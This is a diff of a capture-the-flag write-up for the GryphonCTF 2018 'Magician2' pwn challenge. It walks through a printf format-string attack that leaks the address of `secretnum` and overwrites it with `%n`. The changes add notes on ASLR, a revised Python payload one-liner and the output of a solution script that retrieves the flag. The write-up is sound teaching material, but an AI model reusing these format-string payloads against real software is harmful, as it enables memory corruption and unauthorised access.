@@ -75,23 +75,21 @@ Also notable is the `%n` token in `printf()`, which will read 4 bytes of data fr
 		**Exploitation**
     </summary>
     
-    
-# [IMPORTANT: ENV VARIABLES PUSHED ONTO STACK MAY AFFECT YOUR ADDRESS OF `secretnum`! THIS EXPLOIT MAY NOT WORK FOR YOUR COMPUTER UNLESS YOU HAVE ADAPTED IT APPROPRIATELY! (aka target the program in a "constant" environment!)](https://stackoverflow.com/questions/32771657/gdb-showing-different-address-than-in-code)
 
 With these two pieces of information, exploitation is now possible.
 
-When first connecting to the program, we get the following message.
+When first connecting to the program, the following message appears.
 
     nc 127.0.0.1 18156
     Prove to me magicians can read minds!
     Before you start, please tell me your name (256 chars max): 
     (psst, this aint no magic trick, he's tricky!) 0xffffdd24
 
-Notable is the `0xffffdd24` value printed (**THIS IS THE ADDRESS FOR MY PROGRAM YOURS MAY DIFFER**). It corresponds to a memory address! Looking at the source code, there is a line:
+Notable is the `0xffffdd24` value printed (**NOTE: ASLR ENABLED ON SERVER(in competition). FEEL FREE TO DISABLE, BUT IN THAT CASE WATCH OUT FOR ENV VARIABLES. YOU CAN DISABLE ASLR AND TRY TO EXPLOIT, MAY HELP UNDERSTANDING**). It corresponds to a memory address! Looking at the source code, there is a line:
 
     printf("(psst, this aint no magic trick, he's tricky!) %p\n",&secretnum);
 	
-This shows the address of `secretnum`! This will be useful later. (**address of where variables are stored differ because of environmental variables**: you'll find that the address on the server and your own computer slightly different, which necessitates this particular information)
+This shows the address of `secretnum`! This will be useful later.
 
 Inspecting the code, we also find these lines of interest:
     
@@ -256,7 +254,7 @@ Now would be a good time to inspect what the stack looks like when the program i
     Starting program: /home/kht/Desktop/GCTFLite/GryphonCTF2018-Lite-Challenges/challenges/pwn/Magician2/distrib/magic2-distrib 
     Prove to me magicians can read minds!
     Before you start, please tell me your name (256 chars max): 
-    (psst, this aint no magic trick, he's tricky!) 0xffffcf54				<----- notice the difference in address from the server program and locally run program
+    (psst, this aint no magic trick, he's tricky!) 0xffffcf54				<----- this address is going to be different everytime because of ASLR or environment variables
     %d %d %d %d %d %d      
     I'm thinking of a random number (0 to 1000000), can you tell me what it is?
 
@@ -356,7 +354,7 @@ The 2nd, 3rd and 4th characters are not valid ASCII characters, hence showing a 
 	$���256-1344251840
 	's prediction: HA! the answer was 18 see I knew you couldn't read my mind.
 
-Almost done! Now, `printf()` just needs to print a total of 50 characters to write the value 50 to `secretnum`.
+Almost done! The actual server has ASLR running, which changes `secretnum`'s address. Get the value of the address given by the program, then adapt your attack input accordingly. `printf()` also needs to print a total of 50 characters to write the value 50 to `secretnum`.
 
 One of the ways to force `printf()` to print more characters easily would be to specify the precision for the printf token. We can use the following:
 
@@ -364,9 +362,9 @@ One of the ways to force `printf()` to print more characters easily would be to 
 
 4+16+16+14=50
 
-To print the appropriate output, `python` can be used. 
+To print the appropriate output, `python3` can be used. 
 
-Python 3: `python3 -c "print('s'*8+'\x24\xdd\xff\xff'+'%d'*5+'s'*4+'%n')" > attack`
+Python 3: `python3 -c "print("\x24\xdd\xff\xff%016d%016d%014d%n")" > attack` **NOTE: NOT SOLUTION, ITS AN EXAMPLE WITH ASLR DISABLED ON A PARTICUALR ENVIRONMENT**
 
 Direct the contents of the `attack` file into the program stdin to get the flag.
 
@@ -378,6 +376,13 @@ Direct the contents of the `attack` file into the program stdin to get the flag.
 	$���0000000000000256-00000013442518400000000000000
 	's prediction: Magic??
 	GCTF{unl1k3ly_y0ull_us3_th15_0uts1d3_0f_ctf5}
+
+Actual solution is in solutions folder. Run with python3. It connects to the server and adds the address into the payload accordingly. (recv() may be faulty, in that case try again.)
+
+    kht@ubuntu:~/Desktop/GCTFLite/GryphonCTF2018-Lite-Challenges/challenges/pwn/Magician2/solution$ python3 solution.py
+    I'm thinking of a random number (0 to 1000000), can you tell me what it is?
+    b"\n4g\xe2\xff0000000000000256-00000013483478400000000000000\n's prediction: "
+    b'Magic??\nGCTF{unl1k3ly_y0ull_us3_th15_0uts1d3_0f_ctf5}\n'
 
 </details>
 
